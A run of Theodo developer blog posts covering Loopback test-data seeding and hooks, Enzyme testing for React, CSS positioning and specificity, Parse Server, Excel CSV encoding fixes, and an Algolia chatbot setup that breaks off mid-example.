    expect(fetchedAccounts[0].amount).toEqual(0);
    expect(fetchedAccounts[1].amount).toEqual(100);
    return done();
  })
  .catch(done);
});

The feedDatabase function needs to fill table Person before table BankAccount in order to avoid a foreign key constraint violation error on table BankAccount for constraint personId. We write this feedDatabase function in a module that will be common to all tests.
// In common/test_setup.js
const FEED_ORDER = [
  ['Person'],
  ['BankAccount']
];

var feedDatabaseInOrder = function(index, app, data) {
  var line, modelInsertions, modelName;
  if (index === FEED_ORDER.length) {
    return;
  }
  modelInsertions = [];
  for (modelName of FEED_ORDER[index]) {
    if (data.hasOwnProperty(modelName)) {
      for (line of data[modelName]) {
        modelInsertions.push(app.models[modelName].create(line));
      }
    }
  }
  Promise.all(modelInsertions).then(function() {
    return feedDatabaseInOrder(index + 1, app, data);
  });
};

var feedDatabase = function(app, data) {
  return feedDatabaseInOrder(0, app, data);
};

Note that feedDatabase needs to be given app which is the application instance.
Improvement 1: using a data initializer
Let’s improve our example above. Each bank account needs to belong to a bank.
To satisfy this constraint, our data in the test needs to look like:
var data = {
  Bank: [
    {id: 1, name: 'Bank 1', country: 'France', authorizationNumber: '123'}
  ],
  Person: [
    {id: 1, name: 'Person A'},
    {id: 2, name: 'Person B'}
  ],
  BankAccount: [
    {id: 1, personId: 1, bankId: 1, amount: 100},
    {id: 1, personId: 2, bankId: 1, amount: 0}
  ]
};

We also need to add the Bank model to FEED_ORDER in the common module:
// In common/test.setup.js
const FEED_ORDER = [
  ['Person', 'Bank'],
  ['BankAccount']
];

However, the bank to which the bank accounts belong has no impact on our transfer function. We would like to keep in the test only what is meaningful.
In another common file, let’s define a data initializer. It should contain no business data but a default value for each model with id 1 by convention. The initializer is not meant to be used as test data. Its aim is only to help satisfy foreign key constraints.
// In common/data_initializer.js

const DATA_INITIALIZER = {
  Bank = [
    {id: 1, name: 'Bank 1', country: 'France', authorizationNumber: '123'}
  ],
  BankAccount: [
    {id: 1, personId: 1, bankId: 1, amount: 1}
  ],
  Person: [
    {id: 1, name: 'Person A'}
  ]
};

var getDefaultData = function() {
  // This clones DATA_INITIALIZER so that it cannot be altered
  return JSON.parse(JSON.stringify(DATA_INITIALIZER));
};

In our test, we can now write:
var data = getDefaultData()
data.BankAccount = [
  {id: 1, personId: 1, bankId: 1, amount: 100},
  {id: 1, personId: 2, bankId: 1, amount: 0}
];
data.Person = [
  {id: 1, name: 'Person A'},
  {id: 2, name: 'Person B'}
];

It’s important that you override BankAccount and Person to be able to see all useful data within the test itself and not be dependent on default values such as the default bank account amount.
Improvement 2: resetting id sequences
When hard-coding ids as we did, any further attempt to insert a new entry in the database without hard-coding its id will fail. Indeed, while we inserted data with hard-coded ids, the id sequences were never updated. The database will automatically try to insert the new entry with id 1, which is already used.
The best way to deal with this problem is to reset the id sequence manually. The most transparent is probably to restart the id sequence at the max id of all inserted rows.
// In common/test_setup.js

var updateIdSequences = function(app) {
  var datasourceConnector, table, tables, updates;
  datasourceConnector = app.models[FEED_ORDER[0][0]].dataSource.connector;
  updates = [];

  for (tables of FEED_ORDER) {
    for (table of tables) {

      var tableName = table.toLowerCase();
      var sequence = tableName + '_id_seq';

      updates.push(new Promise(function(resolve, reject) {
        var findMaxIdQuery = 'SELECT MAX(id) FROM ' + table + ';';

        return datasourceConnector.query(findMaxIdQuery, [], getCallback(sequence, dataSourceConnector, reject, resolve));
      }));
    }
  }
  return Promise.all(updates);
};

function getCallback = (sequence, dataSourceConnector, reject, resolve) {
  return function (err1, res) {
    if (err1) { return reject(err1); }

    if (res[0].max != null) {
      var updateIdSequenceQuery = 'ALTER SEQUENCE ' + sequence + ' RESTART WITH ' + (res[0].max + 1) + ';';

      return datasourceConnector.query(updateIdSequenceQuery, [], function(err2) {
        if (err2) { return reject(err2); }
        resolve();
      });
    } else {
      resolve();
    }
  };
}

var feedDatabase = function(app, data) {
  return feedDatabaseInOrder(0, app, data)
  .then(function() {
    // ------------> update all id sequences
    updateIdSequences(app);
  });
};

Improvement 3: debugging the feedDatabase function
When using the feedDatabase function, I once had trouble understanding a bug in one of my tests. I had forgotten to add the new model I had just created to the FEED_ORDER constant. I made a small change to feedDatabase in order to count the number of inserted models. The function now returns an explicit error when one model of data has not been used.
// In common/test_setup.js
var feedDatabaseInOrder = function(index, app, data, countInsertedModels) {
  var line, modelInsertions, modelName;
  if (index === FEED_ORDER.length) {
    return;
  }
  modelInsertions = [];
  for (modelName of FEED_ORDER[index]) {
    if (data.hasOwnProperty(modelName)) {

      // ------------> increment model count
      countInsertedModels++;

      for (line of data[modelName]) {
        modelInsertions.push(app.models[modelName].create(line));
      }
    }
  }
  Promise.all(modelInsertions).then(function() {
    return feedDatabaseInOrder(index + 1, app, data, countInsertedModels);
  });
};

var feedDatabase = function(app, data) {
  return feedDatabaseInOrder(0, app, data, 0)
  .then(function(countInsertedModels) {
    // ------------> throw error if counts don't match
    if(countInsertedModels != Object.keys(data).length) {
      throw new Error('Some model forgotten in FEED_ORDER in common/test_setup.js');
    }
  })
  .then(function() {
    updateIdSequences(app);
  });
};

What we get in the end

common/test_setup.js

const FEED_ORDER = [
  ['Person', 'Bank'],
  ['BankAccount']
];

var feedDatabaseInOrder = function(index, app, data, countInsertedModels) {
  var line, modelInsertions, modelName;
  if (index === FEED_ORDER.length) {
    return;
  }
  modelInsertions = [];
  for (modelName of FEED_ORDER[index]) {
    if (data.hasOwnProperty(modelName)) {
      countInsertedModels++;

      for (line of data[modelName]) {
        modelInsertions.push(app.models[modelName].create(line));
      }
    }
  }
  Promise.all(modelInsertions).then(function() {
    return feedDatabaseInOrder(index + 1, app, data, countInsertedModels);
  });
};

var updateIdSequences = function(app) {
  var datasourceConnector, table, tables, updates;
  datasourceConnector = app.models[FEED_ORDER[0][0]].dataSource.connector;
  updates = [];

  for (tables of FEED_ORDER) {
    for (table of tables) {

      var tableName = table.toLowerCase();
      var sequence = tableName + '_id_seq';

      updates.push(new Promise(function(resolve, reject) {
        var findMaxIdQuery = 'SELECT MAX(id) FROM ' + table + ';';

        return datasourceConnector.query(findMaxIdQuery, [], getCallback(sequence, dataSourceConnector, reject, resolve));
      }));
    }
  }
  return Promise.all(updates);
};

function getCallback = (sequence, dataSourceConnector, reject, resolve) {
  return function (err1, res) {
    if (err1) { return reject(err1); }

    if (res[0].max != null) {
      var updateIdSequenceQuery = 'ALTER SEQUENCE ' + sequence + ' RESTART WITH ' + (res[0].max + 1) + ';';

      return datasourceConnector.query(updateIdSequenceQuery, [], function(err2) {
        if (err2) { return reject(err2); }
        resolve();
      });
    } else {
      resolve();
    }
  };
}

var feedDatabase = function(app, data) {
  return feedDatabaseInOrder(0, app, data, 0)
  .then(function(countInsertedModels) {
    if(countInsertedModels != Object.keys(data).length) {
      throw new Error('Some model forgotten in FEED_ORDER in common/test_setup.js');
    }
  })
  .then(function() {
    updateIdSequences(app);
  });
};


common/data_initializer.js

const DATA_INITIALIZER = {
  Bank = [
    {id: 1, name: 'Bank 1', country: 'France', authorizationNumber: '123'}
  ],
  BankAccount: [
    {id: 1, personId: 1, bankId: 1, amount: 1}
  ],
  Person: [
    {id: 1, name: 'Person A'}
  ]
};

var getDefaultData = function() {
  // This clones DATA_INITIALIZER so that it cannot be altered
  return JSON.parse(JSON.stringify(DATA_INITIALIZER));
};


transfer.test.js

it('should transfer 100 euros', function(done) {
  // Setup data
  var data = getDefaultData()
  data.BankAccount = [
    {id: 1, personId: 1, bankId: 1, amount: 100},
    {id: 1, personId: 2, bankId: 1, amount: 0}
  ];
  data.Person = [
    {id: 1, name: 'Person A'},
    {id: 2, name: 'Person B'}
  ];

  cleanDatabase()
  .then(function() {
    feedDatabase(app, data);
  })
  .then(function() {
    return transfer('Person A', 'Person B', 100);
  })
  .then(function() {
    return Promise.all([
      BankAccount.findById(1),
      BankAccount.findById(2)
    ]);
  })
  .then(function(fetchedAccounts) {
    expect(fetchedAccounts[0].amount).toEqual(0);
    expect(fetchedAccounts[1].amount).toEqual(100);
    return done();
  })
  .catch(done);
});


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Gireg de Kerdanet
  			
  				Web developer at Theodo  			
  		
    
			

									"
"
										Loopback is a node framework based on Express which provides the CRUD to accelerate high value features creation. However, these basic functions may not answer to your needs or partially. For example, you might want to send a mail to the owner of an object when you save it, or update another related object.
Hooks can, and will, help you achieving this.
What’s a hook and its application cases?
Using hooks has the following advantages:

DRY principle, only one hook declaration instead of several function calls
Uncoupling
Separate trade logic from program requirements

A hook is a special event handler. It is bound to events of the framework or program you are using. As such, it is used to alter, augment or replace the behavior of the target.
You should use hooks to perform systematic operations such as:

mail sending
data sanitization (formatting, filtering…)
logging
security checks (encoding, decoding, signing…)

Closer look and examples
If several hooks are attached to the same event, they are executed one after the other in the order of their declaration.
Loopback gives access to three types of hooks: connector, remote and operation.
Connector hooks
If you don’t know what a connector is in Loopback, I suggest you read this.

There are two of them:

'before execute'
'after execute'

The first is called before you make use of a connector, the second when you receive the response from it.
You must always finish your hook by calling next() or ctx.end(), if you don’t, your server will hang. Using next() goes to the next observer whereas ctx.end() ends the observed event. You can see it in the schema on the right.
This category of hooks can be used to log access and queries to your database. Another application would be the formatting of the input/output of your calls to a remote API. For instance, I used the after execute to catch 5XX errors of an API before they are caught and rewritten by a firewall:
myRestConnector.observe('after execute', function(ctx, next) {
  if (/^5/.test(ctx.res.statusCode)) {
    var error = new Error();
    error.status = 400;
    return ctx.end(error, null)
  }
  return next();
});

Remote hooks

beforeRemote()
afterRemote() and afterRemoteError(), only one of these two is called after a remote.

You can use those to do security checks, for example verify access rights, to sanitize your remote input or whitelisting your output. Mostly, it comes handy when the built-in remotes of Loopback do not meet your needs.
Wild cards are allowed in the remote name so you can bind a handler to a set of remotes.
Express
Since Loopback is built on express app.use() is available. It is the easiest way to bind a single handler to remotes with a similar path, but attached to different models.
app.use('/\*/stats', function (req, res, next) {
  console.log(""I match /aModelWithStats/stats and /anotherModelWithStats/stats"");
  return next();
});

Operation hooks
These hooks are directly related to built-in functions of Loopback such as save, delete or find.
They are useful when you need to update relations of a model you just saved, or to log access and modifications on some instance and then warn the owner by mail.
The documentation is quite exhaustive. However I would like to underline that afterInitialize is different from the other operation hooks since it is synchronous. So be careful not to write a heavy function for this handler.
The following example sends a mail if a new instance of MyModel is saved.
MyModel.observe('after save', function(ctx, next) {
  if (ctx.instance && ctx.isNewInstance) {
    let myMessage = { content: 'this is some badass content' };
    myMailingService.send(myMessage);
  }
  return next();
}

Conclusion
I hope this article helped you understand the added value of hooks and that it will give you tools to improve the overall quality of your project.
If you have any question, or remarks about usage, please share them in the comments section below!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Gabriel Andrin
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										React has quickly climbed its way to being a top framework choice for Javascript single page applications.
What’s not to like?

A declarative syntax for UI
Virtual-DOM for performance
The possibility of server-side rendering.

There is however one area that could be improved; its built-in testing utilities – and this is where Enzyme steps in as the must have tool for front-end React testing.
This is an example of a test using the native utilities of the framework:
const myRenderer = ReactTestUtils.createRenderer();
myRenderer.render(<myComponent/>);
const output = renderer.getRenderOutput();
const result =  scryRenderedDOMComponentsWithTag(output, div);

expect(result[0].props.children).toEqual([
    <p>Title</p>
]);

Its verbose, long-winded and not that fun to develop with. The alternative put forward, Enzyme, brings it down to something much more expressive and readable:
const wrapper = shallow(<myComponent/>);
expect(wrapper.find('div').html()).to.equal('<p>Title</p>');

Using the all-powerful find function
Enzyme uses cheeriojs – a small library that implements a subset of jQuery’s core functionalities and makes manipulating components simple. The find() function, used in the example above, can be applied to HTML, JSX and CSS alike – this is key to Enzyme; It gives you the ability to target DOM elements in a clear and concise manner. Here are a few examples of how it can be applied:
componentToTest.find('div'); // On HTML tags
componentToTest.find('.pretty > .red-row'); // On CSS selectors
componentToTest.find('div .nice-style'); // Both !
componentToTest.find('label[visible=true]'); // On properties

The different rendering modes

To understand Enzyme’s key strengths, let’s dive a little into how it simulates components and DOM elements. Although based off react-test-utils, there is enough abstraction that the rendering of a component comes down to 3 functions – shallow, mount and render. Basically ;


Shallow rendering : Is useful to test a component in isolation of every other. In the typical React pattern of smart and dumb components, shallow rendering is usually used to test ‘dumb’ components (stateless components) in terms of their props and the events that can be simulated.


Mounting : Also known as full DOM rendering, it allows you to render a part of the DOM tree and it also gives you access to the lifecycle methods of React components (ComponentWillMount, ComponentWillReceiveProps , etc…)


Static rendering : Is sparsely used but when it is the case, serves as means of testing plain JSX / HTML.


Prior knowledge
This article assumes a classic React stack making use of npm scripts, webpack as a module bundler along with ES6 syntax and it will detail a simple approach to testing your React application.
You may also want to have a quick look at this article if your application uses Redux (link to the article), as it is a common library used in React applications and knowing how to test it may be helpful, in complement to what is explored in this article.
Enjoy!
Setup
Enzyme is completely agnostic to the test runner and assertion libraries that you use; it works with mocha, AVA, Jest… you choose! In this article we will use, without going into too much detail, the following testing tools – so you can keep using your favourites, for me it’s:

Jest as the test runner (although it also handles assertions and spies, I still want to use chai and sinon alongside it because of the syntaxic addons with chai-enzyme and sinon-chai).
Chai as the assertion library.
Sinon for mocks, stubs and test spies.

For jest the setup is simple, just remember to suffix your test files with .test.js (default configuration):
npm install --save-dev jest

And add the following scripts to your package.json scripts object :
""client:test"": ""NODE_ENV=test jest"",
""client:test:watch"": ""NODE_ENV=test jest --watch""

Along with an object at the root of the package.json with jest as a key that configures the jest testing tool (I’ll just include a few key options):
""jest"": {
    ""rootDir"": ""./client/src"",
    ""moduleNameMapper"": {
        ""^.+\\.(css|less)$"": ""<rootDir>/CSSStub.js""
    },
    ""collectCoverage"": true,
    ""coverageDirectory"": ""<rootDir>/../../coverage"",
    ""verbose"": true,
    ""coveragePathIgnorePatterns"": [
        ""<rootDir>/../../node_modules/""
    ]
}

Important: The moduleNameMapper options allows you to mock a module for files that match a particular extension. In projects using webpack it is quite typical to load css inline using the webpack css-loader. The problem is Jest doesn’t know how to interpret the css , so instead make a stub that resolves all inline styles to an empty object contained in <rootDir>/CSSStub.js
Also don’t forget to include these libraries of course!
npm install --save-dev enzyme chai-enzyme sinon

Shallow render and the enzyme API in general
A shallow rendered and a mounted component, have the same methods exposed but different use cases (as in, you will find the same API in the Enzyme docs for both). As a rule of thumb, shallow render is for unit testing and will probably be used for the majority of your test cases. Mounting would be more for a form of ‘front-end integration testing’ (seeing how a change in one component propagates to other components lower in the DOM tree).
Testing your component in terms of data
Let’s use a small snippet of code that renders a rectangle of a certain color, some text and a checkbox. Not an enthralling example, but a useful one in showing how enzyme works.
import React, { PureComponent } from 'react';

class ColoredRectangleComponent extends PureComponent {
  render() {
    return (
      <div className={this.props.elementClass}>
        {`Square text : ${this.props.text}`}
        <input
          type=""checkbox""
          id=""checked""
          value=""active""
          checked=""checked""
          onClick={(event) => { this.props.onCheckboxChange(event); }}
        />
      </div>
    );
  }
}

export default ColoredRectangleComponent;

We want to test three things to begin with; we expect a div, with the correct class and some text. Note that once you have rendered a component for the test, you can easily control the data it handles with setProps() and setState(). You can also access the props and state of a component with props() and state(). This is particularly interesting when testing different outcomes in your component’s display (for instance; hiding part of a component, checking if an error label appears, etc…).
import React from 'react';
import chai, { expect } from 'chai';
import chaiEnzyme from 'chai-enzyme';
import { shallow } from 'enzyme';
import sinon from 'sinon';
import ColoredRectangleComponent from './enzyme';

chai.use(chaiEnzyme());

const clickSpy = sinon.spy();
const props = {
  checked: true,
  elementClass: 'red-square',
  text: 'Enzyme rocks',
  onCheckboxChange: clickSpy,
};

const container = shallow(<ColoredRectangleComponent {...props} />);

describe('tests for <ColoredRectangleComponent> container', () => {
  it('should render one div', () => {
    // You can target DOM, its children(), or an element at() a position
    expect(container.find('div').length).to.equal(1);
  });

  it('should render one div with the correct class applied', () => {
    expect(container.find('div').hasClass('red-square')).to.equal(true);
  });

  it('should contain the text passed as props', () => {
        expect(container.text()).to.equal('Square text : Enzyme rocks');
        // Here is an alternative making use of html()
        expect(container.find('p').html()).to.equal('<p>Square text : Enzyme rocks</p>');
  });

    [...]

Testing your component in terms of events
You are going to want to simulate user interactions with your component. This is where chai-enzyme steps in to provide a variety of assertion addons that will simplify your test syntax. As we are using a checkbox, a quick look at the docs tell us that we are interested by (not.?)to.be.checked().
    [...]

    it('should render a checked checkbox if prop value is true', () => {
        expect(container.find('#checked')).to.be.checked();
    });

    [...]

If we refer back to our tested component, a function is passed down through props and should be triggered upon clicking the element it is bound to (in this case the input tag). For the moment, event propagation and more complex mouse interactions are actively being developped but most use cases are already covered.
    [...]

    it('should trigger onCheckboxChange when simulating a click event on checkbox', () => {
    container.find('#checked').simulate('click');
    expect(clickSpy.calledOnce).to.equal(true);
  });

});

Mounting a component
There may be instances where you don’t want to fully mount a part of the DOM just to test one nested component inside a shallowRendered component. In this case use dive() – but for every other complex case where several nested components need to be tested together, use mount. Let’s have a look at a parent component that makes use of our ColoredRectangleComponent:
import React, { Component } from 'react';
import _ from 'lodash';
import ColoredRectangleComponent from './enzyme';

class Parent extends Component {
  constructor(props) {
    super(props);
    this.state = {
      squareList: [
        {
          text: 'number 1',
          checked: true,
          elementClass: 'red',
        },
        {
          text: 'number 2',
          checked: false,
          elementClass: 'blue',
        },
      ],
    };
  }

  componentDidMount() {}

  render() {
    return (
      <div >
        {_.map(this.state.squareList, (square, index) => {
          return (
            <ColoredRectangleComponent
              key={index}
              checked={square.checked}
              elementClass={square.elementClass}
              text={square.text}
              onCheckboxChange={() => { return null; }}
            />
          );
        })}
      </div>
    );
  }
}

export default Parent;

Again we’ll have a look into two simple test cases; checking if the component does mount and whether or not it renders components correctly according to its state. We are expecting 2 ColoredRectangle components with the correct css classes attributed to them.
import React from 'react';
import { expect } from 'chai';
import { mount } from 'enzyme';
import sinon from 'sinon';

import Parent from './parent';
import ColoredRectangleComponent from './enzyme';


describe('tests for <Parent> container', () => {
  it('should test that the component mounts', () => {
    sinon.spy(Parent.prototype, 'componentDidMount');
    const container = mount(<Parent />);
    expect(Parent.prototype.componentDidMount.calledOnce).to.equal(true);
  });

  it('should render 2 squares with the correct classes', () => {
    const container = mount(<Parent />);
    const expectedClassNamesList = ['red', 'blue'];

    expect(container.find(ColoredRectangleComponent).length).to.equal(2);
    container.find('div').forEach((node, index) => {
      expect(node.hasClass(expectedClassNamesList[index])).to.equal(true);
    });
  });
});

Conclusion
The tools provided by enzyme make testing React applications easy with a minimal setup cost. The documentation  is simple and well illustrated with many examples and different tips. Finally, if you need to debug a component, Enzyme also integrates a debug tool that quite simply prints the rendered element to the console as JSX. Just use console.log(container.debug()). Happy testing !
Useful links :

Enzyme docs
Jest docs
Chai enzyme


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ambroise Laurent
  			
  				Developer at Thedo  			
  		
    
			

									"
"
										Do you sometimes try position: relative then absolute then relative again?
Does it take you more than 2 seconds to decide whether you’re going to use padding or margin?
Have you ever added more than 5 classes to make your CSS work?
If you said yes to one of these questions don’t be ashamed, you’re not alone.
But don’t be afraid, acquiring those skills is a lot easier than you probably think.
Relative or Absolute? Find the reference of your movement!

The position attribute has 5 different values: static, relative, absolute, fixed and sticky.
Whereas fixed is quite straightforward and sticky is still barely used as its support is still limited, many developers struggle to use relative and absolute on point.
So let’s dig into the differences between these positions and find an easy rule to decide which one to use.
If you want to experiment with static, relative and absolute positions, I’ve made a Codepen on purpose.

Perhaps even Albert Einstein hesitated between relativity and absolutivity
Static
That one is the default value.
It will add it to the flow as it is defined by other propopreties such as display, margin or padding.
If you try to use top, bottom, left or right it will have no effect.
Relative
position: relative will move the element from the position it would have had, had it been positionned with static.
So using left: 20px will move your element 20 pixels on the left from its static position.
One more thing to notice is that elements around will behave as if its position were static.
Absolute
If you use top: 0 and left: 0;, your element will go on the top left corner of its first non static parent element.
Be careful: if the element’s parent’s position is static, it won’t be the reference!
If you want to make it the reference, there’s one simple trick : using position: relative for the parent 😉
Also, all its siblings and parent elements will behave as if it didn’t exist.
So, how to decide over relative or absolute?
 
The key is to identify the reference for the position.
position: relative is to be used when you want to move an element from its static position.
When you want to move your element inside its parent, then position: absolute is the best choice.
Margin or Padding? Imagine your element was clickable!

When you want to set spaces between elements in CSS you can either use margin or padding.
The 4 main differences between the 2 properties are:

margin is applied outside the border of an element, whereas padding is applied inside
the padding zone of an element is clickable if the element is clickable, the margin zone is not
the padding zone of an element has the same background color as the element, the margin zone the same as the element behind
vertical margin values collapse – unless one of your elements is positionned with absolute or floating – see this Codepen

So, how to choose between the two?
Well if the element I want to space has borders, it is pretty easy to find out: if the space is outside the borders then I use margin, otherwise I use padding.
But when it’s not the case, I ask myself:
If the element was clickable, could I click on the space?
Or its variant: If the element had a background color, would the space had the same?
If so then I use padding!
 
How many classes do I need to add? Know the rules of specificity!
Let’s say I want to center a paragraph, inside a div which has a class called intro. I could write it like:
.intro p {
  text-align: center;
}

But sometimes it would not work, and when I opened my Dev Tools I would see this:

Crap! Looks like Chrome has decided to take another rule before mine!
How can I override this? Well, there are some lazy ways: put !important which basically overrides everything, or put it as inline CSS.

But it is a bad idea to use !important, because if you want to override this rule later, well, you’ll have no choice but to add an !important (and then, nothing becomes important anymore…).
So how can I apply my new CSS rule?
To decide which rule to apply over another, Chrome uses the specificity of each rule.
Here is a simplified way of how it works:

the rule with the more ids wins

e.g. #lean > .waterfall


if there is a draw, the rule with the more classes wins

e.g. .scrum .agile > li.stock


if there is a draw, the rule with the more tags wins

e.g. ul li a.improvement > p.rework a


if there is a draw, the rule declared last in the stylesheet wins

Final Word
I’ve met a lot of web developers who understand closures, functional programming, lambda calculus or who can retro-engineer APIs, package applications with Webpack in their sleep or even code efficiently with Vim.
Yet, these briliant people were completely naked when it came to centering a button on a page.
Is it because it is super hard to do? Certainly not.
Is it because they’re not clever enough? Probably not.
I can’t tell for them, but I can tell for myself. For a long, long time I assumed CSS was easy, and not worth spending time to study it in depth. I even felt a bit ashamed every time I googled something about style. But it’s not because something is simple that you should not try to master it. On the contrary, it takes only a few minutes to understand some subtleties and that can save you a lot of pain.
There’s still a lot you can learn about CSS in the next minutes like why it does not make any sense to use z-indexes over 10 in most applications, how float works or you can get into flexbox if you’ve got more time.
If you liked this article or you know fellow developers who might learn some tricks from it please share it, and leave a comment below if you think it can be improved!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Louis Zawadzki
  			
  				I drink tea and build web apps at Theodo.  			
  		
    
			

									"
"
										Interesting fact: In October 2016, for the first time, the majority of the Internet traffic came from mobile devices.
It confirms mobile devices market as the priority for the next years and it motivates more and more people to jump into the adventure of “Create my App”.

  
Some developers looking for a good app idea. (2017)

But developing an app is not an easy task. Indeed, besides obvious features for your app, you will need a complete infrastructure behind, with a database, a server, handling notifications, etc.
Taking care of all this stuff takes a lot of time, work, tears, and doesn’t bring business value. And as a developer, it requires a whole new set of skills to handle it.
For instance, you’re at a hackathon. You want a quick prototype of your app, but you fail completely because of your broken backend which you spent half of the time to configure. Annoying, isn’t it?
Are we sentenced to write CRUD and setup backends all our lives? I say no!

  

Introducing the BaaS
And to support my No, I present the BaaS (for Backend as a Service). It will allow you to connect your mobile apps to cloud-based services by providing an API and SDKs. This includes key features like:

User management
Cloud storage
Push notifications
Integration with social networking services

And it’s a booming market: in 2012, the BaaS market was worth 215 Million USD and it should be worth 28.10 Billion USD by 2020.
Obviously, competition is tough. How can we choose among all the BaaS offers?

  

Parse Server
Don’t worry, I’ve got this. For this perilous adventure, we will use Parse Server, a wonderful and powerful toolbox.

  


But before using it, where does it come from?
A quick history
Parse was founded in 2011. The firm was developing at the time Parse Platform, a BaaS (surprising, isn’t it? ¯\_(ツ)_/¯).
It quickly gained in popularity to the point of being acquired by Facebook in 2013 for $85 million. In 2014, Parse was reported to power 500,000 mobile apps!
Sadly, in January 2016, Facebook announced that it would close Parse down, with services effectively shutting down in January 2017. But good news, Parse did open the application source code in order to allow users to perform the migration: this was the birth of Parse Server.
What does it do?
Although Parse Server is no longer really a BaaS, it does everything that I said.
One of the big advantages of Parse compared to its competitors is its impressive choice of SDK. Whether you need a common database for your iOS and Android apps, or if you want to store all the data from your Arduinos in a same place, Parse Server’s got your back.
It has a dashboard where you can administrate multiple Parse instances, support Push notifications, Cloud Code, and soon Analytics.

  
  The Parse Server Dashboard


In addition, it’s open source with almost 30k stars in total (counting SDKs, Dashboard, etc.) on GitHub. It’s a living project which evolves very quickly.
My experience
There are other “real” BaaS existing on the market. Firebase, by Google, is a really good one. I chose Parse here because when I started, there wasn’t much choice, and when I had this need again a few months ago, Parse Server was here, waiting for me, as a solid competitor. Since, I don’t regret my choice. Being an active open-source project makes the whole thing more lively, more dynamic, and likely to evolve quickly. And if you’re afraid to install Parse Server infrastructure on a server, many well-known providers has ready-to-go offers for you (like Heroku, AWS, Windows Azure, etc.).
I used it on personal projects in Python, Ionic 2 and soon on my Rasberry Pi and Arduinos. It helps me a lot, saving me a lot of time and tears. Even if my projects were small, if you are worried in terms of reliability for real projects, it was made for this in the first time.
Now, it’s your turn
If you have an MVP to do by tomorrow and you still haven’t started, this is your moment.
To start quickly, you have:

The Parse Platform website
The Parse Server GitHub repository
The documentation
A docker-compose ready Parse Server

You are only one-click away if you use online providers (such as Heroku, Azure, AWS)…
Enjoy!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Adrien Lacroix
  			
  				Web Developer at Theodo  			
  		
    
			

									"
"
										CSV is great, especially to export or import table-like data into your system. It is plain-text and it can also be opened with Microsoft Excel and be edited by almost anyone, even non technical people. But, despite all those advantages, the use of CSV that has been edited with Excel comes with a massive drawback: if your file contains non ASCII characters, you enter what I personally call the encoding hell.
Some context
As a french company, we deal on a regular basis with non ASCII characters like éèêàç and so on. We were developing a web application where our client needed to import data using CSV files. The files were to be modified by non technical personnel using Microsoft Excel for Windows (2007 version) and we couldn’t change that. The application backend was coded using NodeJS and the Loopback framework.
So we developed the CSV importer and data looking like this in Excel:

Ended up like this in the database:

Needless to say that our client was not satisfied with the presence of this character: �.
What caused this problem
After a few research, we discovered that Excel do not encode CSV files in good old UTF-8 when saving them.
Fact is that Excel for Windows encode CSV in ISO-8859-1 and Excel for OSX in macintosh encoding. Unfortunately, it seems that this cannot be overridden in Excel for now, so we couldn’t ask our client to change his configuration. We had to handle this within the application.
How we solved it
iconv-lite is a great javascript library for dealing with encoding conversions. After having figured out from which encoding decode our files, we only had to add this code to our CSV importer, right before the CSV parsing:
iconv = require('iconv-lite');

...

originalFile = fs.readFileSync(filename, {encoding: 'binary'});
decodedFile = decode(originalFile, 'iso88591');

We knew that our client would only use Excel for Windows, so we didn’t bother implement an OSX compatible solution, but if you need to create a multi OS importer, you could use a trick like this:

originalFile = fs.readFileSync(filename, {encoding: 'binary'});
decodedFile = decode(originalFile, 'iso88591');
if(decodedFile.indexOf('é') < 0) {
  decodedFile = decode(originalFile, 'macintosh');
}

Here, we know that after decoding we should find the character “é” in the header of the CSV (in the “Catégorie” and “Période” columns). So we try first the Windows compatible decoding and if it fails (if we do not find the “é”), we try the OSX compatible one.
Conclusion
Yay! You escaped the encoding hell! If you want to learn more about CSV import in Loopback, you should certainly read this great article about user-friendly transactional CSV import.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Georges Biaux
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										In my first article, I talked about creating an MVP with a Chatbot and showed an example with Cinebot
But getting the bot up and running wasn’t enough.
It needed to be able to search complex data from text and location queries sent by the user through Messenger.
So I started to look for a cheap and flexible solution to store and retrieve data. At around the same time I heard about Algolia, a French company providing exhaustive search capabilities through a SaaS platform, and decided it was worth trying out.
In this article I’ll explain how I tuned Algolia to provide relevant search for my users in just a few hours.
Introduction
Algolia acts as a data store, so I will fetch the screenings data daily using cron jobs and upload it there.
This will allow my chatbot to use Algolia’s exhaustive search capabilities to return relevant data.
Here is a diagram to show what the architecture of the project looks like:

💵 Algolia Free Plan: Discovery
Algolia Free Plan includes 10,000 records and 100,000 operations (an operation can be adding a record or querying the database).
It’s quite limited but enough for my MVP: creating a chatbot to help Parisians find showtimes in their city.
For approximately all the Paris and surrounding area, I have 2,500 records per day.
Which means ~30×2,500 = 75,000 operations per month, which fits into the free plan.
N.B: In order to use Algolia Free Plan, you must put their logo somewhere in your product
Creating an index and getting the keys 👆
First you need to go to https://www.algolia.com/explorer/indices and to create a new index (the equivalent of a MongoDB collection, that will hold your records).
Give it the name you want, I called mine cine_seances.
Then head to https://www.algolia.com/api-keys to get your Application ID and Admin API Key.
Then we’re ready to roll.
Data Description
The searchable items are releases: they represent all the screenings for a given movie in a given cinema, on a given day:
{
  ""place"": {
    ""name"": ""Le Cinéma des Cinéastes"",
    ""city"": ""Paris 17e arrondissement"",
    ""postalCode"": ""75017"",
  },
  ""movie"": {
    ""title"": ""Moonlight"",
    ""language"": ""Anglais"",
    ""vo"": true,
    ""posterUrl"": ""http://images.allocine.fr/pictures/17/01/26/09/46/162340.jpg"",
    ""pressRating"": 4.18421,
    ""userRating"": 4.07561159,
    ""url"": ""http://www.allocine.fr/film/fichefilm_gen_cfilm=242054.html"",
    ""is3D"": false,
    ""releaseDate"": ""2017-02-01"",
    ""trailerUrl"": ""http://www.allocine.fr/video/player_gen_cmedia=19565733&cfilm=242054.html""
  },
  ""date"": ""2017-02-24"",
  ""times"": {
